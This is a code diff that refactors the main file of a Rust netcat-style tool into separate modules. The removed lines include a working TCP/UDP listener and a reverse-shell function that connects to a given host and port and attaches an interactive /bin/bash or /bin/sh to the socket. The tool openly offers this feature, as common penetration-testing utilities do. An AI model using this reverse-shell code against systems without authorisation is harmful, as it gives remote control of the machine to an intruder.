@@ -3,41 +3,17 @@
 // by: robiot & contributors
 /////////////////////////////
 
-use rustyline::error::ReadlineError;
-use std::net::SocketAddr;
-use std::process::{Command, Stdio};
-use rustyline::Editor;
-use std::io::{self, Write};
+
 use getopts::Options;
 use termion::color;
 
-extern crate socket2;
-
-use self::socket2::{Socket, Domain, Type};
-
-use std::os::unix::io::{AsRawFd, FromRawFd};
+mod options;
+mod listener;
+mod revshell;
 
 
 /* Global Variables */
 const __VERSION__: &'static str = env!("CARGO_PKG_VERSION");
-
-/* Use laters */
-struct Opts<'a> {
-    host: &'a str,
-    port: &'a str,
-    transport: Protocol,
-    mode: Mode,
-}
-
-enum Protocol {
-    Tcp,
-    Udp,
-}
-
-enum Mode {
-    Normal,
-    Beta,
-}
 
 /* Help -h */
 fn print_help(program: &str, opts: Options) {
@@ -47,208 +23,13 @@ fn print_help(program: &str, opts: Options) {
 }
 
 /* Prints error */
-fn print_error(err: &str) {
+fn print_error(err: String) {
     eprintln!(
         "{}rc:{} {}",
         color::Fg(color::LightRed),
         color::Fg(color::Reset),
         err
     );
-}
-
-/* Print when started listening */
-fn print_started_listen(opts: &Opts) {
-    println!(
-        "Listening on {}{}{}:{}{}{}",
-        color::Fg(color::LightGreen),
-        opts.host,
-        color::Fg(color::Reset),
-        color::Fg(color::LightCyan),
-        opts.port,
-        color::Fg(color::Reset)
-    );
-}
-
-// Commented, becuase I dont know if this will work in non terminal enviroments
-/* Print when reverse shell started */
-/*fn print_started_revshell(ip: String, port: String) {
-    println!(
-        "Started Reverse Shell on {}{}{}:{}{}{}",
-        color::Fg(color::LightGreen),
-        ip,
-        color::Fg(color::Reset),
-        color::Fg(color::LightCyan),
-        port,
-        color::Fg(color::Reset)
-    );
-}*/
-
-/* Piped thread */
-fn pipe_thread<R, W>(mut r: R, mut w: W) -> std::thread::JoinHandle<()>
-where
-    R: std::io::Read + Send + 'static,
-    W: std::io::Write + Send + 'static,
-{
-    std::thread::spawn(move || {
-        let mut buffer = [0; 1024];
-        loop {
-            let len = r.read(&mut buffer).unwrap();
-            if len == 0 {
-                println!(
-                    "\n{}[-]{}Connection lost",
-                    color::Fg(color::LightRed),
-                    color::Fg(color::Reset)
-                );
-                std::process::exit(0);
-            }
-            
-            w.write_all(&buffer[..len]).unwrap();
-            w.flush().unwrap();
-        }
-    })
-}
-
-/* Listen on given host and port */
-fn listen(opts: &Opts) -> std::io::Result<()> {
-    match opts.transport {
-        Protocol::Tcp => {
-            let listener = std::net::TcpListener::bind(format!("{}:{}", opts.host, opts.port))?;
-            print_started_listen(opts);
-
-            let (mut stream, _) = listener.accept()?;
-            match opts.mode {
-                Mode::Normal => {
-                    let t1 = pipe_thread(std::io::stdin(), stream.try_clone()?);
-                    let t2 = pipe_thread(stream, std::io::stdout());
-                    t1.join().unwrap();
-                    t2.join().unwrap();
-                }
-                Mode::Beta => {
-                    // For command line history there is a better way of doing it
-                    // You can constantly send the input to the revshell and let it do the stuff
-                    // instead of doing the history locally and getting the line deleted
-                    let t = pipe_thread(stream.try_clone().unwrap(), std::io::stdout()); 
-                    let mut rl = Editor::<()>::new();
-                
-                    loop {
-                        let readline = rl.readline(">> "); // &buffer[..len] ?
-                        match readline {
-                            Ok(command) => {
-                                rl.add_history_entry(command.as_str());
-                                let command = command.clone() + "\n";
-                                stream
-                                    .write_all(command.as_bytes())
-                                    .expect("Faild to send TCP.");
-                            }
-                            Err(ReadlineError::Interrupted) => {
-                                std::process::exit(0);
-                            }
-                            Err(ReadlineError::Eof) => {
-                                std::process::exit(0);
-                            }
-                            Err(err) => {
-                                println!("Error: {:?}", err);
-                                break;
-                            }
-                        }
-                    }
-                
-                    t.join().unwrap();
-                }
-            }
-        }
-
-        Protocol::Udp => {
-            // Can be made better probably...
-            // Rustline is needed here because else you cant delete characters
-            let socket = std::net::UdpSocket::bind(format!("{}:{}", opts.host, opts.port))?;
-            print_started_listen(opts);
-        
-            use std::sync::{Arc, Mutex};
-            let addr: Arc<Mutex<Option<std::net::SocketAddr>>> = Arc::from(Mutex::new(None));
-        
-            let addr_clone = addr.clone();
-            let socket_clone = socket.try_clone().unwrap();
-            std::thread::spawn(move || loop {
-                let mut buffer = [0; 1024];
-                let (len, src_addr) = socket_clone.recv_from(&mut buffer).unwrap();
-                *addr_clone.lock().unwrap() = Some(src_addr);
-
-                io::stdout().write_all(&buffer[..len]).unwrap();
-                io::stdout().flush().unwrap();
-            });
-        
-            loop {
-                let mut rl = Editor::<()>::new();
-                loop {
-                    let readline = rl.readline(">> ");
-                    match readline {
-                        Ok(command) => {
-                            rl.add_history_entry(command.as_str());
-                            let command = command.clone() + "\n";
-                            
-                            let addr_option = *addr.lock().unwrap();
-                            if let Some(addr) = addr_option {
-                                socket.send_to(command.as_bytes(), addr).unwrap();
-                            } else {
-                                panic!("Cannot send udp packet");
-                            }
-                        }
-                        Err(ReadlineError::Interrupted) => {
-                            std::process::exit(0);
-                        }
-                        Err(ReadlineError::Eof) => {
-                            std::process::exit(0);
-                        }
-                        Err(err) => {
-                            println!("Error: {:?}", err);
-                            std::process::exit(0);
-                        }
-                    }
-                }
-            }
-        }
-    }
-    return Ok(());
-}
-
-/* Open A Sh/Bash Reverse Shell */
-fn revshell(ip: String, port: String, shell: String){
-    // Limit to just these 
-    if shell != "bash" && shell != "sh"
-    {
-        print_error("Invalid Shell. Available shells (bash/sh).");
-        return;
-    }
-
-    let full: String = format!("{}:{}", ip, port);
-    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();
-
-    match socket.connect(&full.parse::<SocketAddr>().unwrap().into()) {
-        Ok(_) => {}
-        Err(err) => {
-                print_error(&err.to_string());
-                return;
-            }
-    }
-
-    let s = socket.into_tcp_stream();
-    let fd = s.as_raw_fd();
-
-    //print_started_revshell(ip, port);
-
-    // Open shell
-    Command::new(format!("/bin/{}", shell))
-        .arg("-i")
-        .stdin(unsafe { Stdio::from_raw_fd(fd) })
-        .stdout(unsafe { Stdio::from_raw_fd(fd) })
-        .stderr(unsafe { Stdio::from_raw_fd(fd) })
-        .spawn()
-        .unwrap()
-        .wait()
-        .unwrap();
-
-    println!("Shell exited");
 }
 
 /* Main */
@@ -269,7 +50,7 @@ fn main() {
     let matches = match opts.parse(&args[1..]) {
         Ok(m) => m,
         Err(err) => {
-            print_error(&err.to_string());
+            print_error(err.to_string());
             return;
         }
     };
@@ -298,11 +79,14 @@ fn main() {
             opt_port = matches.free[1].to_string();
             opt_shell = matches.free[2].to_string();
         } else {
-            print_error("Invalid Reverse Shell Mode Usage [ip] [port] [shell]");
+            print_error("Invalid Reverse Shell Mode Usage [ip] [port] [shell]".to_string());
             return;
         };
         
-        revshell(opt_host, opt_port, opt_shell);
+        let revshell_return = revshell::shell(opt_host, opt_port, opt_shell);
+        if !revshell_return.is_empty(){
+            print_error(revshell_return)
+        }
         return;
     }
 
@@ -313,28 +97,28 @@ fn main() {
         } else if matches.free.len() == 2 {
             (matches.free[0].as_str(), matches.free[1].as_str())
         } else {
-            print_error("Invalid Listen Mode Usage [ip] [port]");
+            print_error("Invalid Listen Mode Usage [ip] [port]".to_string());
             ("", "");
             return;
         };
 
-        let opts = Opts {
+        let opts = options::Opts {
             host: opt_host,
             port: opt_port,
             transport: if matches.opt_present("u") {
-                Protocol::Udp
+                options::Protocol::Udp
             } else {
-                Protocol::Tcp
+                options::Protocol::Tcp
             },
             mode: if matches.opt_present("H") {
-                Mode::Beta
+                options::Mode::Beta
             } else {
-                Mode::Normal
+                options::Mode::Normal
             },
         };
 
-        if let Err(err) = listen(&opts) {
-            print_error(&err.to_string());
+        if let Err(err) = listener::listen(&opts) {
+            print_error(err.to_string());
             return;
         };
     } else {
